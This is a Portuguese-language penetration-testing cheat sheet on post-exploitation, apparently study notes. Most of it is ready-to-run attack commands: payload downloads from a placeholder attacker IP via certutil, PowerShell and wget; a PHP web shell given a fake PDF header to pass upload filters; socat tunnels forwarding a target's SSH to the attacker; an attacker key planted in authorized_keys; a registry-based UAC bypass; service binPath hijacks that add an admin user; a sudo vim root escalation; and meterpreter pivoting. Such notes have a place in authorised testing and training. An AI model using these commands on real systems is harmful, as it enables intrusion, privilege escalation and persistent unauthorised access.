PÓS EXPLORAÇÃO
========================================================================================================

ETAPAS:
-  Obter info do host comprometido(enumeração do host)
-  Elevar o nivel de acesso(escalar privilegios)
-  Atacar e explorar serviços internos(tunneling)
-  Deslocar-se para outros hosts ou redes(pivoting)
-  Buscar por arquivos sensiveis
-  Documentar(coleta evidencias)

----------------------------------------------------------

-  Após ganhar shell, transformar shell não Interativa p/ Interativa
-   `python -c 'import pty; pty.spawn("/bin/bash")'`    (vai chamar o bash do server)


-  Transferencia de Arquivos: WEB
-  OBS: Subir exploit para filebin.net e gerar link (alternativa ao subir server em rede local para baixar exploit)

Pentester Server
-   `Apache: service apache2 start (/var/www/html/file.exe)`
-   `Python: python -m SimpleHTTPServer 80`
-   `Python3:python3 -m http.server 80`

Alvos
Windows
-   `certutil.exe -urlcache -f http://ipatacante/file.exe file.exe`
-   `powershell.exe wget http://ipatacante/file.exe -OutFile file.exe`

Evil WINRm
-   `Após ter acesso user e senha em uma maquina, iniciar o ataque de movimentação`
-   `verificar se o serviço WINRM esta startado, utilizar o nmap nse especifico para verificar`
-   `/usr/share/nmap/scripts`
-   `vi winrm.nse  (https://github.com/RicterZ/My-NSE-Scripts/blob/master/scripts/winrm.nse)`

-   `https://github.com/Hackplayers/evil-winrm`
-   `./evil-winrm.rb -i IPALVO -u usuarioalvo -p senhaalvo`

Linux
-   `wget http://ipatacante/file.exe -O /tmp/file.exe`
-   `curl http://ipatacente/file.exe -o file.exe`


Transferencia de Arquivos: FTP
-  Pentester Server
-  pip install pyftpdlib 
-  python -m pyftpdlib -p 21 --write 
-  *objetivo é subir o exploit no server ftp, e tranferir pro alvo
-  *se exister bloqueio de extensão usar a tecnica abaixo
--------------------
`nano rce.php.pdf
%PDP-1.3
<?php 
system($_GET['hack']);
?>`
---------------------
*enviar via campo de envio no site, depois manipular o arquivo e conseguir shell reversa via meterpreter


Tunelamento - Linux  (podera ser usado no windows, instalando o netcat)
*ao ganhar shell do server, rodar o netstat -nlpt e verificar as portas locais abertas para realizar o tunel
-   `socat TCP4:ip-atacante:8443 TCP4:127.0.0.1:22  (comando irá enviar o trafego da porta 22 para porta 8443 do atacante)`
*na maquina atacante ficar escutando na porta
-   `socat TCP4-LISTEN:8443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr`
*apos conseguir conexao, rodar o nmap na porta 2222 local 127.0.0.1  (pois assim verifica que conseguimos entrar localmente)


Escalando acesso SSH sem Senha
*apos tunelar dentro da aplicação para maquina local, gerar par de chaves para autenticar.
-   `ssh-keygen -f desec (maquina atacante)`
*no alvo criar pasta e arquivos ssh
-   `mkdir ~www-data`
-   `mkdir ~/.ssh/`
-   `touch ~/.ssh/authorized_keys`
-   `echo "ssh-rsa  toda chave .pub do atacante" > ~/.ssh/authorized_keys`
*na maquina atacante fechar o ssh usando porta e chave
-   `ssh www-data@127.0.0.1 -p 2222 -i teste`


Enumeração - Windows
*apos ganhar shell do windows testar comando para levantar informações, ou usar programas automatizados
Tips n Tricks
-   `net user`
-   `systeminfo`
-   `whoami /groups`
-   `where /R c:\web.txt  (ou qualquer arquivo que queira procurar no sistema)`
-   `findstr /s "pass=" *.txt  (procura pela palavra pass em arquivos de extensão txt)`


Enumeração Windows Automatizada
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
*baixar o winpeas.bat no kali e abrir porta para enviar o bat
-   `nano winpeas.bat (colar o codigo)`
-   `python -m SimpleHTTPServer 80` 
*na maquina alvo receber
-   `powershell -c "wget http://ipatacante/winpeas.bat -Outfile winpeas.bat"`
-   `winpeas.bat  (vai varrer e levantar as infos)`

https://github.com/bitsadmin/wesng
*git clone na maquina atacante, esse utilitário irá varrer as vulnerabilidades do sistema alvo
*na maquina alvo, usar o comando -systeminfo > systeminfo.txt  (com esse arquivo das infos do sistema usar no utilitario)
-   `cd wesng  (no kali)`
-   `python wes.py --update (vai atualizar a base de vulns)`
-   `python wes.py systeminfo.txt  (copiar e colar esse arquivo na maquina atacante ou as infos dele)`


BYPASS UAC 
*baixar o SysInternalsSuite na maquina invadida
-   `sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe  (sigcheck analisa informações de aplicações)  *Aplicação fodhelper.exe (melhor para teste)`
<autoElevate>true</autoElevate>   (linha do retorno do sigcheck que mostra a aplicação requer elevação do admin)
*Abrir o procmon.exe (para monitorar os processo)
-   `Em filtros, no campo inserir o processo a ser atacado (ex:ComputerDefaults.exe)`
-   `abrir o processo no terminal (C:\Windows\System32\computerdefaults.exe)`
-   `filtrar dentro desse processo (path -> contains -> HKCU)  seria para o current user`
-   `filtra (Result -> contains -> NAME NOT FOUND)  (marcar as saidas com HighLight botao direito encima)`   
*Objetivo é criar uma entrada de processo que nao existe, identificando ponto para subir terminal como admin sem uac barrar
-   `no terminal (reg add HKCU\Software\Classes\ms-settings\Shell\Open\command` 
-   `no terminal (reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f`
*apos inserção, chamar a aplicação (C:\Windows\System32\computerdefaults.exe) e a mesma irá chamar o cmd com permissao full,
explorando ponto de falha no registro para bypass no uac (mesma ideia alguns exploits fariam)

     
Windows Privilege
-   `wmic service get Name,State,PathName | findstr "Running" | find "Program"    (mostra os programas rodando no momento)` 
-   `icacls "C:\Program Files (x86)\NoMachine\bin\nxservice64.exe"  (informações permissão do programa)`
*localizar aplicação vuln com privilegio e tentar dar bypass, com sysinternals
-   `sc config Advancedsystemcareservice13 binPath="net user hack admin@123 /add"`
*subir shell no metasploit para maquina alvo baixar e ganhar a shell via aplicaçao vuln
-   `sc config Advancedsystemcareservice13 binPath="certutil -urlcache -f http://192.168.0.16/file.exe file.exe"`


Linux Privilege
*verificar passwd(usuarios) verificar o crontab
-   `git clone (LinPEAS) - Linux privilege Escalatio script  (encontrar as possiveis vulns)`
-   `git clone (MimiPeguim) - captura senhas em memoria igual mimikatz`
-   `sudo vim -c '!bash'  (no caso vim estava rodando como sudo, feito isso escala o privilegio pra root)`
-   `sudo -l (ve os programas rodando com sudo)`


Pivoting Externo para Interno
*após ganho shell no meterpreter, usar proxychains e modulo route do meterpreter para tunelar a internet com a rede local
-   `route (ver as rotas)`
-   `run autoroute -s 10.20.20.0/24 `
-   `use auxiliary/server/socks4a  `
-   `proxychains nmap -v --open -sT -p 110,139 -Pn 10.10.20.0/24`
